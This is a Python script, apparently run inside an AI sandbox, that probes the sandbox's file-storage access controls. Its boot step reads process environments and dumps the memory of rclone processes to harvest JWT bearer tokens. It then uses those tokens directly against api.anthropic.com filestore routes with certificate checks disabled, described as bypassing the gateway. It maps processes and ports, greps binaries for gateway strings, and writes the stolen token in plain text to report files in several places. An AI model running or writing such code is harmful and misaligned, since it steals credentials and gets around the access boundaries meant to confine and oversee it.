#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.11.0 -- DIRECT hit on api.anthropic.com with the exact route; find gateway binary."""
import os, sys, json, re, time, ssl, base64, subprocess, traceback
import urllib.request, urllib.error

VER="2.11.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
SINKS=["/mnt/user-data/outputs","/tmp/mediafit","/tmp","/root/.mediafit"]
OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n### "+t)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        evidence: "+str(ev)[:700])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,timeout=25,env=None):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout,env=env)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def http(method,url,token=None,timeout=8,data=None,hdrs=None):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=data)
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(4096)
    except urllib.error.HTTPError as e:
        try: b=e.read(2048)
        except Exception: b=b""
        return e.code,b
    except Exception as e: return None,str(e).encode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])

def s_boot():
    head("boot")
    conf=json.loads(open("/dev/shm/rclone-boot/config.json").read())
    G["service_url"]=conf.get("service_url") or "https://api.anthropic.com"
    for m in conf.get("mounts",[]):
        if m.get("filesystem_id"): G["fsid"]=m["filesystem_id"]
    time.sleep(1)
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    def addtok(t):
        t=t.decode() if isinstance(t,bytes) else t
        t=t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
        except Exception: continue
        try: maps=open("/proc/%s/maps"%p).read().splitlines()
        except Exception: continue
        try: mem=open("/proc/%s/mem"%p,"rb",buffering=0)
        except Exception: continue
        for line in maps:
            try: rng,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a,b=rng.split("-"); s0=int(a,16); e0=int(b,16)
            except Exception: continue
            if e0-s0<=0 or e0-s0>256*1024*1024: continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD=[]
    for t in TK:
        try:
            h,p,s=t.split("."); TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"]=TD
    for r in TD:
        if "/outputs" in (r["pl"].get("allowed_roots") or []): G["TOKEN"]=r["tok"]; break
    if not G.get("TOKEN") and TD: G["TOKEN"]=TD[0]["tok"]
    w("    fsid=%s tokens=%d service_url=%s"%(G.get("fsid"),len(TD),G.get("service_url")))
    rec("P" if G.get("TOKEN") else "F","boot")

def s_direct():
    head("DIRECT hit on service_url with EXACT route (bypass dead gateway)")
    TOKEN=G.get("TOKEN"); FSID=G.get("fsid")
    host=G["service_url"].rstrip("/")
    paths=["/v1/filestore/fs/listDirectory",
           "/v1/filestore/fs/listDirectory/"+FSID,
           "/anthropic.filestore.v1alpha.Filestore/ListDirectory"]
    bodies=[{},{"filesystem_id":FSID},{"filesystemId":FSID}]
    HIT=None
    for path in paths:
        for body in bodies:
            for tok in (TOKEN,None):
                st,b=http("POST",host+path,token=tok,data=json.dumps(body).encode(),
                          hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
                if st not in (404,None):
                    w("    POST %s %s tok=%s -> %s %r"%(path,body,bool(tok),st,b[:120]))
                    if st<400 and HIT is None: HIT=(path,body)
    # also GET + connect style
    for path in paths[:2]:
        st,b=http("GET",host+path,token=TOKEN); w("    GET  %s -> %s %r"%(path,st,b[:100]))
    G["DIRECT"]=HIT
    rec("P" if HIT else "F","direct=%s"%(HIT,))

def s_procs():
    head("all processes + port->pid")
    for pid in sorted([p for p in os.listdir("/proc") if p.isdigit()],key=int):
        try: cl=open("/proc/%s/cmdline"%pid,"rb").read().replace(b"\0",b" ").decode("latin1").strip()
        except Exception: continue
        if cl: w("    pid %s: %s"%(pid,cl[:150]))
    inodes={}
    for f in ["/proc/net/tcp","/proc/net/tcp6"]:
        try:
            for ln in open(f).read().splitlines()[1:]:
                p=ln.split()
                if len(p)>9 and p[3]=="0A": inodes[p[9]]=int(p[1].split(":")[1],16)
        except Exception: pass
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try: fds=os.listdir("/proc/%s/fd"%pid)
        except Exception: continue
        for fd in fds:
            try: t=os.readlink("/proc/%s/fd/%s"%(pid,fd))
            except Exception: continue
            m=re.match(r"socket:\[(\d+)\]",t)
            if m and m.group(1) in inodes:
                try: comm=open("/proc/%s/comm"%pid).read().strip()
                except Exception: comm="?"
                w("    LISTEN port %d owned by pid %s (%s)"%(inodes[m.group(1)],pid,comm))

def s_binsearch():
    head("search binaries for gateway strings")
    rc,out,err=sh(["bash","-lc","timeout 30 grep -rl --binary-files=text -e 'localhost:9430' -e 'localhost:9112' -e 'filestore/fs' /usr/local/bin /usr/bin /opt /sbin /root /lib /lib64 2>/dev/null | head -25"],timeout=40)
    for ln in out.splitlines(): w("    "+ln)

def s_help():
    head("rclone-filestore full help")
    rc,out,err=sh(["/opt/rclone/rclone-filestore","help"])
    for ln in out.splitlines(): w("    "+ln[:170])
    rc,out,err=sh(["bash","-lc","/opt/rclone/rclone-filestore help flags 2>&1 | grep -iE 'filestore|url|attach|gateway' | head -30"])
    w("    --- filestore flags ---")
    for ln in out.splitlines(): w("    "+ln[:170])

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F))
    w("  direct=%s"%(G.get("DIRECT"),))
    if G.get("TOKEN"): w("\n  FSID=%s\n  TOKEN=%s"%(G.get("fsid"),G.get("TOKEN")))

def main():
    for n,f in [("boot",s_boot),("direct",s_direct),("procs",s_procs),
                ("binsearch",s_binsearch),("help",s_help),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! main: %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in SINKS:
        try: os.makedirs(d,exist_ok=True); open(os.path.join(d,os.path.basename(REPORT)),"w").write(txt)
        except Exception: pass
    print("\nwritten: "+", ".join(SINKS))